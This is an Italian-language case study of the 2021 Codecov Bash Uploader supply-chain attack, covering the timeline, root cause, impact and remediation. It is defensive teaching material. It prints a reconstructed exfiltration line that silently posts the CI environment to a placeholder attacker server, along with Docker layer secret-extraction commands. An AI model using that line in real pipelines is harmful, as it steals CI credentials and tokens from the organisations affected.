# Case Study — Codecov Bash Uploader Compromise (2021)

> **Aggiornamento:** 2026-05-22
> **CVE:** N/A (nessun CVE assegnato formalmente; advisory Codecov CODECOV-2021-0401)
> **Tipo:** supply-chain attack via CI/CD tooling
> **Severità stimata:** CRITICA — credential exfiltration su larga scala
> **Durata compromissione:** 31 gennaio 2021 – 1 aprile 2021 (~60 giorni)

Vedi anche `../../06-GESTIONE-PIATTAFORME/99-CASE-STUDY/codecov-bash-uploader.md` per analisi
focalizzata sulla piattaforma.

---

## Sommario esecutivo

Nel gennaio 2021, un attaccante ha ottenuto accesso non autorizzato al processo di build
dell'immagine Docker di Codecov. Sfruttando una credenziale esposta in un layer intermedio
dell'immagine, l'attaccante ha modificato il Bash Uploader script — uno strumento usato da
decine di migliaia di repository per inviare dati di code coverage ai server Codecov.

Lo script modificato esfiltrava variabili d'ambiente — inclusi token CI/CD, chiavi AWS, token
GitHub, credenziali di database — verso un server controllato dall'attaccante. La compromissione
è rimasta non rilevata per circa 60 giorni, colpendo potenzialmente qualsiasi organizzazione
che abbia eseguito `curl -s https://codecov.io/bash | bash` nei propri pipeline CI durante
quel periodo.

L'incidente rappresenta uno dei più significativi attacchi supply-chain nel dominio CI/CD e ha
accelerato l'adozione di pratiche come il pinning degli hash, la verifica crittografica degli
script CI, e la revisione sistematica dei layer Docker.

---

## Timeline dettagliata dell'incidente

### Fase 1 — Compromissione iniziale (31 gennaio 2021)

| Data | Evento |
|------|--------|
| **2021-01-31** | L'attaccante sfrutta un errore nel processo di creazione dell'immagine Docker di Codecov. Una credenziale (token di accesso allo storage GCS) era stata inclusa in un layer intermedio dell'immagine Docker usata nel processo CI di Codecov stesso. L'attaccante estrae questa credenziale. |
| **2021-01-31** | Usando la credenziale GCS, l'attaccante ottiene accesso in scrittura al bucket dove è ospitato il Bash Uploader script (`codecov.io/bash`). |
| **2021-01-31** | Prima modifica malevola del Bash Uploader. Lo script originale viene sostituito con una versione che include una riga di exfiltration. |

### Fase 2 — Exfiltration attiva (febbraio – marzo 2021)

| Periodo | Dettaglio |
|---------|-----------|
| **2021-02 / 2021-03** | Ogni volta che un pipeline CI scarica ed esegue il Bash Uploader, le variabili d'ambiente del runner vengono inviate via `curl` a un endpoint controllato dall'attaccante. Le variabili tipicamente includono: `GITHUB_TOKEN`, `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `CODECOV_TOKEN`, variabili custom con credenziali database, chiavi API di terze parti. |
| **2021-02 / 2021-03** | L'attaccante aggiorna periodicamente lo script malevolo — almeno una modifica nota il 2021-03-01 — per evitare detection basata su hash statico. |

### Fase 3 — Rilevamento e disclosure (aprile 2021)

| Data | Evento |
|------|--------|
| **2021-04-01** | Codecov rileva l'anomalia — discrepanza tra hash SHA dello script nel repository Git e hash dello script servito dal bucket GCS. Avvia indagine interna. |
| **2021-04-15** | Codecov pubblica advisory pubblico. Notifica diretta ai clienti potenzialmente impattati. |
| **2021-04-15** | Codecov rende disponibile una versione bonificata dello script e una lista di IoC (Indicator of Compromise). |
| **2021-04-16 – 2021-04-30** | Organizzazioni colpite iniziano rotazione massiva di credenziali. Twitch, HashiCorp, Confluent e altre aziende confermano pubblicamente di essere tra le vittime. |
| **2021-04-29** | HashiCorp pubblica un proprio advisory: la signing key GPG usata per firmare release di Terraform, Vault, Consul era tra le credenziali esfiltrate. HashiCorp ruota la chiave. |
| **2021-04 – 2021-05** | FBI avvia indagine federale sull'incidente. |

---

## Analisi tecnica approfondita

### Il vettore: Docker image layer credential leak

Il problema alla radice era una credenziale inclusa in un layer intermedio dell'immagine Docker
usata internamente da Codecov per il proprio CI.

In Docker, ogni istruzione nel `Dockerfile` crea un layer. Anche se una credenziale viene rimossa
in un layer successivo, rimane accessibile nei layer precedenti dell'immagine:

```dockerfile
# Esempio di pattern vulnerabile (NON fare questo)
FROM python:3.9

# Layer 1: copia file con credenziali
COPY .env /app/.env

# Layer 2: build
RUN pip install -r requirements.txt

# Layer 3: rimuove credenziali (INUTILE — rimangono nel Layer 1)
RUN rm /app/.env
```

I layer Docker sono estraibili singolarmente:

```bash
# Estrarre layer da un'immagine
docker save myimage:latest -o image.tar
tar xf image.tar
# Ogni directory contiene un layer.tar
# La credenziale "rimossa" è ancora nel layer precedente
```

Nel caso Codecov, la credenziale GCS era stata esposta in modo simile — presente durante
il build, rimossa dopo, ma ancora estraibile dal layer intermedio.

### Lo script malevolo: anatomia dell'injection

Il Bash Uploader originale (`codecov.io/bash`) è uno script shell che:

1. Rileva il provider CI (GitHub Actions, Travis, CircleCI, Jenkins, ecc.)
2. Raccoglie coverage report
3. Li invia all'API Codecov

L'attaccante ha aggiunto una singola riga di exfiltration strategica:

```bash
# Riga aggiunta dall'attaccante (ricostruzione semplificata)
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" \
  http://<attacker-controlled-server>/upload/v2 || true
```

Caratteristiche dello payload malevolo:

- **`curl -sm 0.5`**: timeout di 0.5 secondi, modalità silenziosa — se il server attaccante
  è irraggiungibile, il pipeline CI non fallisce
- **`|| true`**: il fallimento del curl non interrompe lo script
- **`$(env)`**: dump completo di tutte le variabili d'ambiente del processo CI
- **`$(git remote -v)`**: identifica il repository target

Lo script continuava a funzionare normalmente dopo l'exfiltration — l'upload della coverage
aveva successo, quindi nessun alert basato su "CI pipeline failure" veniva triggerato.

### Perché `curl | bash` è un antipattern critico

```bash
# Pattern usato da migliaia di pipeline CI
curl -s https://codecov.io/bash | bash

# Problemi fondamentali:
# 1. Nessuna verifica dell'integrità dello script
# 2. Esecuzione con i privilegi completi del runner CI
# 3. Lo script può cambiare tra un download e l'altro
# 4. Man-in-the-middle possibile senza certificate pinning
# 5. Nessun audit trail di cosa è stato effettivamente eseguito
```

Alternativa sicura — pinning + verifica:

```bash
# Download con verifica SHA
EXPECTED_SHA="e3b0c44298fc1c149afbf4c8996fb924..."
SCRIPT=$(curl -s https://codecov.io/bash)
ACTUAL_SHA=$(echo "$SCRIPT" | sha256sum | cut -d' ' -f1)

if [ "$ACTUAL_SHA" != "$EXPECTED_SHA" ]; then
  echo "ERRORE: hash mismatch — script potenzialmente compromesso"
  exit 1
fi

echo "$SCRIPT" | bash
```

### Variabili d'ambiente tipicamente esfiltrate

In un runner CI standard (GitHub Actions, Travis CI, CircleCI), le variabili d'ambiente
accessibili includono:

```text
# GitHub Actions
GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
GITHUB_REPOSITORY=org/repo
GITHUB_SHA=abc123...
ACTIONS_RUNTIME_TOKEN=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...

# Credenziali custom settate come secret
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLE
DATABASE_URL=postgresql://user:password@host:5432/db
NPM_TOKEN=npm_xxxxxxxxxxxxxxxxxxxxx
CODECOV_TOKEN=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx

# Variabili CI provider
CI=true
CI_BUILD_ID=12345
```

---

## Root cause analysis

### Causa primaria

Credenziale GCS inclusa in un layer intermedio dell'immagine Docker del processo CI di Codecov.
Questo ha fornito accesso in scrittura al bucket GCS che ospitava il Bash Uploader.

### Cause contribuenti

| Causa | Dettaglio |
|-------|-----------|
| **Mancanza di firma crittografica** | Il Bash Uploader non aveva firma GPG o verifica di integrità — chiunque con accesso al bucket poteva sostituirlo silenziosamente. |
| **`curl \| bash` come pattern raccomandato** | La documentazione ufficiale Codecov raccomandava `curl -s https://codecov.io/bash \| bash`, normalizzando l'esecuzione di script remoti senza verifica. |
| **Nessun monitoring sull'integrità dello script** | Non esisteva un sistema automatizzato che verificasse periodicamente che lo script nel bucket corrispondesse alla versione nel repository Git. |
| **Secret leaking nei Docker layers** | Pratica comune ma pericolosa; assenza di scan automatizzato per credenziali nei layer Docker. |
| **60 giorni senza detection** | Assenza di anomaly detection sul traffico in uscita dai runner CI e assenza di integrity monitoring sullo script. |

### Diagramma della kill chain

```text
1. Credential nel Docker layer
       ↓
2. Attaccante estrae credenziale GCS
       ↓
3. Accesso in scrittura al bucket GCS
       ↓
4. Modifica del Bash Uploader script
       ↓
5. Pipeline CI scaricano script compromesso
       ↓
6. Variabili d'ambiente esfiltrate (env dump)
       ↓
7. Attaccante ottiene token/chiavi di migliaia di repo
       ↓
8. Accesso laterale a sistemi downstream (AWS, GitHub, DB)
```

---

## Valutazione dell'impatto

### Impatto diretto

- **Numero di repository potenzialmente impattati:** decine di migliaia (Codecov dichiarava
  ~29.000 organizzazioni clienti al momento dell'incidente)
- **Durata dell'esposizione:** ~60 giorni (31 gennaio – 1 aprile 2021)
- **Tipi di credenziali esfiltrate:** token GitHub, chiavi AWS, token npm, token Codecov,
  stringhe di connessione database, chiavi API di terze parti, chiavi di firma

### Vittime confermate pubblicamente

| Organizzazione | Impatto dichiarato |
|----------------|-------------------|
| **HashiCorp** | Chiave GPG di firma per Terraform/Vault/Consul compromessa; rotazione completa. |
| **Twitch** | Confermato impatto; dettagli non divulgati pubblicamente. |
| **Confluent** | Confermato impatto; rotazione credenziali avviata. |
| **Monday.com** | Indagine interna confermata. |
| **Rapid7** | Confermato uso dello script nel periodo di compromissione. |

### Impatto indiretto

- **Costo di rotazione credenziali:** per organizzazioni enterprise, la rotazione completa
  di tutti i secret usati nei pipeline CI durante 60 giorni è un'operazione che richiede
  giorni/settimane di lavoro.
- **Impatto sulla fiducia nell'ecosistema CI/CD:** l'incidente ha dimostrato che un singolo
  tool di coverage può essere il vettore per compromettere l'intera supply chain.
- **Accelerazione normativa:** ha contribuito all'executive order del maggio 2021
  sulla cybersecurity della supply chain software (EO 14028).

---

## Remediation — Azioni correttive

### Azioni immediate (ore/giorni)

```bash
# 1. Verificare se il proprio CI usava il Bash Uploader nel periodo compromesso
# Cercare nei log CI tra 2021-01-31 e 2021-04-01
grep -r "codecov.io/bash" .github/workflows/ Jenkinsfile .circleci/ .travis.yml

# 2. Se positivo: rotazione COMPLETA di tutti i secret del pipeline
# Non solo quelli "probabilmente esposti" — TUTTI
# L'attaccante ha fatto env dump, quindi tutto è compromesso

# 3. Verificare log di accesso AWS/GitHub/npm per attività anomala
aws cloudtrail lookup-events \
  --start-time 2021-01-31 \
  --end-time 2021-04-15 \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole

# 4. Revocare e rigenerare tutti i token
gh auth refresh  # GitHub
aws iam create-access-key --user-name cicd-user  # AWS (dopo delete del vecchio)
npm token create  # npm (dopo revoke del vecchio)
```

### Azioni a medio termine (settimane)

1. **Migrare dal Bash Uploader a Codecov GitHub Action con SHA pin:**

```yaml
# PRIMA (vulnerabile)
- name: Upload coverage
  run: curl -s https://codecov.io/bash | bash

# DOPO (sicuro — SHA pinned)
- name: Upload coverage
  uses: codecov/codecov-action@e28ff129e5465c2c0dcc6f003fc735cb6ae0c673 # v4.5.0
  with:
    token: ${{ secrets.CODECOV_TOKEN }}
    fail_ci_if_error: true
```

2. **Implementare permissions minime nel workflow:**

```yaml
# Limitare i permessi del GITHUB_TOKEN
permissions:
  contents: read
  # Solo i permessi strettamente necessari

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      # ...
```

3. **Egress firewall su self-hosted runner:**

```bash
# iptables — bloccare tutto il traffico in uscita tranne destinazioni note
iptables -A OUTPUT -d api.codecov.io -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -d github.com -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -d registry.npmjs.org -p tcp --dport 443 -j ACCEPT
# ... altre destinazioni necessarie ...
iptables -A OUTPUT -p tcp --dport 443 -j DROP  # blocca tutto il resto HTTPS
iptables -A OUTPUT -p tcp --dport 80 -j DROP   # blocca tutto HTTP
```

### Azioni a lungo termine (mesi)

1. **Docker image hardening — multi-stage build per eliminare credential leak:**

```dockerfile
# Stage 1: build (credenziali presenti ma non nell'immagine finale)
FROM python:3.9 AS builder
ARG GCS_TOKEN
RUN pip install -r requirements.txt
RUN python setup.py build

# Stage 2: runtime (nessuna credenziale)
FROM python:3.9-slim
COPY --from=builder /app/dist /app/dist
# Il token GCS NON esiste in questa immagine
```

2. **Scan automatizzato dei Docker layer per secret:**

```bash
# Trivy — scan immagini Docker per secret e vulnerabilità
trivy image --scanners secret,vuln myimage:latest

# Gitleaks — scan specifico per secret
gitleaks detect --source . --no-git
```

3. **Integrity monitoring per script CI distribuiti:**

```bash
# Cron job o GitHub Action che verifica l'hash dello script
# ogni ora e alerta in caso di modifica non autorizzata
EXPECTED_HASH="sha256:abc123..."
CURRENT_HASH=$(curl -s https://tool.example.com/script.sh | sha256sum)
if [ "$CURRENT_HASH" != "$EXPECTED_HASH" ]; then
  # Alert via PagerDuty/Slack/email
  curl -X POST "$ALERT_WEBHOOK" -d '{"text":"ALERT: CI script hash changed"}'
fi
```

---

## Risposta dell'industria

### Reazioni immediate

- **GitHub** ha pubblicato guidance rafforzata sull'uso di action con SHA pinning e
  permessi minimi.
- **CISA** (Cybersecurity and Infrastructure Security Agency) ha emesso un alert
  (AA21-104A) raccomandando a tutte le organizzazioni di verificare l'esposizione.
- **Docker** ha accelerato il lavoro su BuildKit secret mounts come alternativa sicura
  al passaggio di credenziali durante il build.

### Cambiamenti strutturali nell'ecosistema

| Area | Prima dell'incidente | Dopo l'incidente |
|------|---------------------|------------------|
| **Distribuzione script CI** | `curl \| bash` raccomandato da molti vendor | SHA pinning e verifica crittografica diventano best practice |
| **Docker layer security** | Scan limitato a CVE nelle dipendenze | Scan per secret nei layer intermedi diventa standard |
| **CI/CD secret management** | Secret come variabili d'ambiente persistenti | Push verso OIDC federation (es. AWS OIDC provider per GitHub Actions) |
| **Supply chain attestation** | Concetto accademico (SLSA ancora in draft) | Accelerazione del framework SLSA e adoption di Sigstore/cosign |

### SLSA e Sigstore

L'incidente Codecov è stato uno dei catalizzatori per l'adozione di:

- **SLSA (Supply-chain Levels for Software Artifacts):** framework che definisce livelli
  di sicurezza per la supply chain software, dal livello 1 (provenienza documentata) al
  livello 4 (build ermetici con verifica a due parti).
- **Sigstore/cosign:** infrastruttura di firma e verifica keyless per artifact software,
  che rende la firma crittografica accessibile anche a progetti open source.

---

## Lezioni apprese

### 1. `curl | bash` è un antipattern di sicurezza critico

Non importa quanto sia affidabile il vendor — se lo script viene servito da un bucket cloud,
il bucket è il punto più debole della catena. Ogni script CI deve essere:
- Versionato nel repository
- Verificato con hash o firma crittografica
- Eseguito da un artifact immutabile

### 2. I Docker layer sono un archivio permanente

Ogni `RUN`, `COPY`, `ADD` nel Dockerfile crea un layer persistente. "Rimuovere" un file
in un layer successivo non lo elimina dai layer precedenti. Usare multi-stage build o
BuildKit `--mount=type=secret` per credenziali.

### 3. Le variabili d'ambiente sono il bersaglio principale

I runner CI espongono un enorme numero di credenziali tramite variabili d'ambiente.
Un singolo `env` dump fornisce accesso laterale a decine di sistemi. Minimizzare le
variabili d'ambiente disponibili nel runner e preferire meccanismi OIDC/federation.

### 4. Il monitoraggio dell'integrità è non-negoziabile

60 giorni senza detection significano che nessuno stava verificando che lo script servito
corrispondesse alla versione nel repository. Integrity monitoring automatizzato è
essenziale per qualsiasi artifact distribuito.

### 5. Permessi minimi (`permissions: {}`) limitano il blast radius

Se un workflow GitHub Actions ha `permissions: {}`, anche se un'action è compromessa,
il `GITHUB_TOKEN` ha capacità nulle. Ogni permesso aggiunto è superficie d'attacco.

### 6. La rotazione credenziali deve essere pre-pianificata

Organizzazioni che avevano procedure documentate per la rotazione di tutti i secret CI
hanno risposto in ore. Quelle senza procedure hanno impiegato settimane.

---

## Checklist di prevenzione

### Per ogni repository con pipeline CI

- [ ] Nessun `curl | bash` o equivalente senza verifica hash/firma
- [ ] Tutte le GitHub Actions pinnate con SHA completo, non tag mutabile
- [ ] `permissions: {}` o permessi minimi espliciti in ogni workflow
- [ ] Secret CI con scoping minimo (repository-level, non org-level quando possibile)
- [ ] Egress filtering configurato su self-hosted runner
- [ ] `CODEOWNERS` per proteggere modifiche ai file `.github/workflows/`
- [ ] Audit trimestrale dei secret CI — rimuovere quelli non più necessari

### Per immagini Docker che gestiscono credenziali

- [ ] Multi-stage build: credenziali solo nello stage di build, mai nell'immagine finale
- [ ] `--mount=type=secret` di BuildKit per credenziali durante il build
- [ ] Scan automatizzato dei layer per secret (Trivy, Gitleaks, GitGuardian)
- [ ] Nessun `COPY .env` o equivalente nel Dockerfile
- [ ] Image digest pinning (`image@sha256:...`) invece di tag mutabili

### Per tool vendor e maintainer

- [ ] Firma crittografica di ogni artifact distribuito
- [ ] Integrity monitoring automatizzato sugli artifact pubblicati
- [ ] Separazione fisica tra credenziali di build e artifact di distribuzione
- [ ] Incident response plan documentato per compromissione della supply chain
- [ ] Comunicazione trasparente con gli utenti in caso di incidente

---

## Comandi pratici di verifica

### Verificare lo stato attuale dei propri workflow

```bash
# Cercare usi di curl|bash nei workflow
grep -rn "curl.*|.*bash\|curl.*|.*sh\|wget.*|.*bash" \
  .github/workflows/ 2>/dev/null

# Cercare action senza SHA pin (solo tag mutabili)
grep -rn "uses:.*@v[0-9]" .github/workflows/ 2>/dev/null | \
  grep -v "@[a-f0-9]\{40\}"

# Verificare i permessi dei workflow
grep -rn "permissions:" .github/workflows/ 2>/dev/null
# Se nessun risultato: i workflow hanno permessi massimi per default

# Verificare il numero di secret configurati
gh secret list 2>/dev/null
```

### Configurare Renovate per auto-update SHA pin

```json
{
  "extends": ["config:base"],
  "github-actions": {
    "enabled": true,
    "pinDigests": true
  }
}
```

### Verificare integrità di un'immagine Docker

```bash
# Verificare con cosign (Sigstore)
cosign verify --key cosign.pub myregistry/myimage@sha256:abc123

# Ispezionare i layer di un'immagine per secret
docker history --no-trunc myimage:latest
docker save myimage:latest | tar -xf - -C /tmp/layers/
# Ispezionare ogni layer per credenziali
find /tmp/layers -name "layer.tar" -exec tar -tf {} \; | \
  grep -i "env\|secret\|key\|token\|password\|credential"
```

---

## Confronto con incidenti simili

| Aspetto | Codecov 2021 | SolarWinds 2020 | tj-actions 2025 |
|---------|-------------|-----------------|-----------------|
| **Vettore** | Docker layer → script CI | Build system compromise → update | Account maintainer → tag hijack |
| **Durata** | ~60 giorni | ~9 mesi | ~1 giorno |
| **Detection** | Hash mismatch interno | FireEye analisi malware | Community detection (StepSecurity) |
| **Impatto** | Credenziali CI | Backdoor in software enterprise | Secret CI di repo pubblici |
| **Lezione chiave** | Verificare integrità artifact distribuiti | Verificare integrità del build system | Pinnare SHA, non tag |

---

## Riferimenti

1. Codecov Security Advisory (15 aprile 2021):
   `https://about.codecov.io/security-update/`
2. HashiCorp Advisory — Codecov Bash Uploader Impact:
   `https://discuss.hashicorp.com/t/hcsec-2021-12-codecov-security-event-and-hashicorp-gpg-key-exposure/`
3. CISA Alert AA21-104A:
   `https://www.cisa.gov/news-events/alerts/2021/04/16/codecov-bash-uploader-compromise`
4. Ars Technica — analisi dettagliata:
   `https://arstechnica.com/information-technology/2021/04/backdoored-code-coverage-tool/`
5. Docker documentation — Multi-stage builds:
   `https://docs.docker.com/build/building/multi-stage/`
6. SLSA Framework: `https://slsa.dev/`
7. Sigstore/cosign: `https://www.sigstore.dev/`

---

## Cross-links

- Modulo 19 — `../19-github-actions-ci-cd-ricette.md`.
- Modulo 21 — `../21-github-actions-self-hosted-runners.md`.
- Modulo 27 — `../27-supply-chain-attestation-slsa.md`.
- Case Study correlato — `./tj-actions-changed-files-2025.md`.
